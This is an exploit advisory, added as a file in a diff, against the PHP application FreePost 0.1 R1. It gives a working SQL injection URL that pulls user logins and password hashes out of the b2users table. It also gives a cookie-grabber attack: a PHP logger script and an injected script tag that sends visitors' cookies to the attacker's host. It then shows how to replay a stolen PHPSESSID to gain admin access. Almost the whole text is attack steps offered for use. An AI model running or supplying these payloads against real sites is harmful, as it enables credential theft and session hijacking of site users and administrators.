@@ -1,0 +1,57 @@
+#####################################################################################################
+# Exploit FreePost 0.1 R1 SQL Injection
+# Date: June 6nd 2012
+# Author: ThE g0bL!N
+# Version: 0.1 R1
+# Vendor Url: http://www.phpbrasil.com/script/dYRoLbwWu_zR/freepost-01-r1
+# Tested on: Xp Service Pack 2
+#####################################################################################################
+#  Greets To : Lider Pirata  , Yassine Tablouche , Ilyes , Bilal ,
+Habib,  Djamal  , Boukhors .. etc
+#####################################################################################################
+
+Exploit:
+--------
+ 1) You Need To register
+ 2) http://localhost/freepost0.1-R1/edit.php?action=edit&post=1 [SQL CODE]
+ 3) /edit.php?action=edit&post=-1+union+select+1,2,3,concat(user_login,0x3a,user_pass),5,6,7+from+b2users--
+
+
+#################################################################################################################
+[+] FreePost 0.1 R1 Cookie Grabber Exploit
+[+] Discovered By ThE g0bL!N
+[+] Greets To : Lider Pirata , Yassine Tablouche , Ilyes , Bilal ,
+Habib, Djamal , Boukhors .. etc
+[+] Vendor:http://www.phpbrasil.com/script/dYRoLbwWu_zR/freepost-01-r1
+#################################################################################################################
+PoC
+--
+[+] Make 2 files and upload to your host :
+[+]cookie.php - > Put in this File That Code:
+<?php
+$cookie = $_GET['cookie'];
+$log = fopen("log.txt", "a");
+fwrite($log, $cookie ."\n");
+fclose($log);
+?>
+[+]log.txt - > CHMOD it 777 and put in the same directory with cookie.php
+
+[+]Exploit:
+-------
+1)First Register in the site
+2) go to http://site.com/edit.php
+3) add This Code :<script>document.location
+="http://localhost/[path]/cookie.php?cookie=" +
+document.cookie;</script>
+4) any one open this page engenie.php you gonna still his cookies
+
+Example
+-------
+Result:
+------
+PHPSESSID:aafaa0f2cad7431d5cec1431e5bafb03
+Then we put that code
+javascript:document.cookie="PHPSESSID=aafaa0f2cad7431d5cec1431e5bafb03;path=/";
+After That you see :
+Hello Admin :)
+################################################################################################################
